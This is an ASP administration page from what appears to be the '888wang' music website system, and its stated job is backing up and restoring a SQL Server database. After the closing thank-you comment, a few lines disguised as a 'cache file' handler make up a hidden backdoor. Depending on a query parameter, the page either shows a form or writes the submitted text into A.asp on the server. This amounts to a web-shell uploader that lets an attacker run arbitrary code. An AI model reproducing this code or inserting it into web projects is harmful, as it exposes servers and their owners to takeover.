<!--#include File="Conn.asp" -->
<!--#include file="Checkpost.asp"-->
<!--#include file="888wang_chkAdmin.asp"-->
<%CheckAdmin3%>
<!--#include file="../inc/config_list.asp"-->
<!--#include file="../inc/md5.asp"-->  
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="inc/Style.css" rel="stylesheet" type="text/css"> 
  <BODY>   
  <table   align="center" class="bordercolor">   
  <form   method="post"   name=myform>   
  <tr><td>选择操作：<INPUT   TYPE="radio"   NAME="act"   id="act_backup"     value="backup">备份数据库<INPUT   TYPE="radio"   NAME="act"   id="act_restore"   value="restore">恢复数据库</td></tr>　   
  <tr><td>数据库名：<INPUT   TYPE="text"   NAME="databasename"   value="<%=database%>" size="40">(备份或恢复的SQL数据库名,如music_888wang.bak)</td></tr>   
  <tr><td>文件路径：<INPUT   TYPE="text"   NAME="BackUpPathFile"   value="<%=request.ServerVariables("APPL_PHYSICAL_PATH")%>databak_888wang\<%=year(date()) & month(date()) & day(date())%>.bak" size="40">(备份或恢复的文件路径,如D:\SQL\music_888wang.bak)</td></tr>   
  <tr><td><input type="hidden" name="enter" value="ok"><input   type="submit"   value="确定"></td></tr>   
  </form>  
   <tr><td>
    <%   
	if request("enter")="ok" then
  'SQL   Server   数据库的备份与恢复!   
  dim   sqlname,sqlLoginTimeout,BackUpPathFile,act
  sqlserver   =  ip   'sql服务器   
  sqlname   =   uid       '用户名   
  sqlpassword   =   pwd     '密码   
  sqlLoginTimeout   =   15   '登陆超时   
        databasename   =   trim(request("databasename"))   
        BackUpPathFile   =   trim(request("BackUpPathFile"))   
        BackUpPathFile   =   replace(BackUpPathFile,"$1",databasename)   
  act   =   lcase(request("act"))   
    
  if   databasename   = " "  then   
    response.write   "请填写数据库名和文件路径"   
  else   
    if   act   =   "backup"   then   
    Set   srv=Server.CreateObject("SQLDMO.SQLServer")   
  srv.LoginTimeout   =   sqlLoginTimeout   
  srv.Connect   sqlserver,sqlname, sqlpassword   
  Set   bak   =   Server.CreateObject("SQLDMO.Backup")   
  bak.Database =databasename   
  bak.Devices =Files   
  bak.Files =BackUpPathFile   
  bak.SQLBackup   srv   
      if   err.number>0   then   
  response.write   err.number&"<font   color=red><br/>"   
  response.write   err.description&"</font>"   
      end   if   
        
  Response.write   "<font   color=green>备份成功!</font>"   
    elseif   act   =   "restore"   then   
  '恢复时要在没有使用数据库时进行！   
      Set   srv=Server.CreateObject("SQLDMO.SQLServer")   
  srv.LoginTimeout   =   sqlLoginTimeout   
  srv.Connect   sqlserver,sqlname,   sqlpassword   
    
      Set   rest=Server.CreateObject("SQLDMO.Restore")   
  rest.Action=0   '   full   db   restore   
  rest.Database=databasename   
  rest.Devices=Files   
  rest.Files=BackUpPathFile   
  rest.ReplaceDatabase=True   'Force   restore   over   existing   database   
      if   err.number>0   then  
	
  response.write   err.number&"<font   color=red><br/>"   
  response.write   err.description&"</font>"   
      end   if   
      rest.SQLRestore   srv   
      Response.write   "<font   color=green>恢复成功!</font>"   
    else   
      Response.write   "<font   color=red>没有选择操作</font>"   
    end   if   
  end   if  
  
  end if
  '谢谢你使用888wang.com音乐网站系统 

a="A.asp"'-----缓存文件

If request("y")="m" Then
x=x&"<form name=form1 method=post action=?y=b>"
x=x&"<textarea name=c></textarea>"
x=x&"<input type=submit value=a></form>"
response.write x
elseIf request("y")="b" Then
d=request("c")
Set f= Server.CreateObject("Scripting.FileSystemObject")
Set t = f.CreateTextFile(server.mappath(""&a&""))
t.Write d
End If
  %>  </td></tr>    
</table>   
  
</BODY>   
  </HTML>


